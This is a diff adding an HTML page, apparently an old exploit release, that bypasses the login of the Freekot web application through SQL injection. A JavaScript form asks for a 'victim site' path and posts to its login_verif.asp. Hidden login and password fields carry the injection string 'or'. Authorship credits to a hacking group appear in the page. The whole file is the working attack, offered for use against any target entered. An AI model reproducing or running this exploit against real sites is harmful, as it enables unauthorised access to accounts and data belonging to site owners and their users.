@@ -1,0 +1,32 @@
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;KAPDA :: Freekot SQL-Injection Vulnerability , Login bypass 
+exploit &lt;/title&gt;&lt;/head&gt;
+&lt;body bgcolor=&quot;black&quot;&gt;
+&lt;script language=&quot;JavaScript&quot;&gt;
+function egxpl() {
+  if (document.xplt.victim.value==&quot;&quot;) {
+    alert(&quot;Please enter victim site!&quot;);
+    return false;
+  }
+  if (confirm(&quot;Are you sure?&quot;)) {
+    xplt.action=document.xplt.victim.value+&quot;/login_verif.asp&quot;;
+    xplt.login.value=document.xplt.login.value;
+    xplt.password.value=document.xplt.password.value;
+    xplt.submit();
+  }
+}
+&lt;/script&gt;&lt;font face=Verdana size=2 color=&quot;#00FF00&quot;&gt;&lt;center&gt;&lt;b&gt;KAPDA :: 
+Freekot SQL-Injection Vulnerability&lt;br&gt;
+Discovered and coded by FarhadKey From KAPDA.IR&lt;br&gt;
+Special Thx to Hessam-x From Anti-Security.net (Hackerz.ir)&lt;br&gt;&lt;/b&gt;
+&lt;form name=&quot;xplt&quot; method=&quot;post&quot; onsubmit=&quot;egxpl();&quot;&gt;
+&lt;br&gt;Victim Path : (insert http:// for path)&lt;br&gt;
+&lt;input type=&quot;text&quot; name=&quot;victim&quot; 
+value=&quot;http://www.victim.com/FreeKot_Path/&quot; size=&quot;44&quot; class=&quot;xpl&quot; 
+style=&quot;color: #00FF00; background-color: #000000&quot;&gt;&lt;br&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;login&quot; value=&quot;&#039;or&#039;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;&#039;or&#039;&quot;&gt;&lt;br&gt;
+&lt;!-- Discovered and coded by FarhadKey . Kapda.ir --&gt;
+&lt;input type=&quot;submit&quot; value=&quot;GO !!!&quot; style=&quot;color: #00FF00; 
+background-color: #000000&quot;&gt;
+&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;
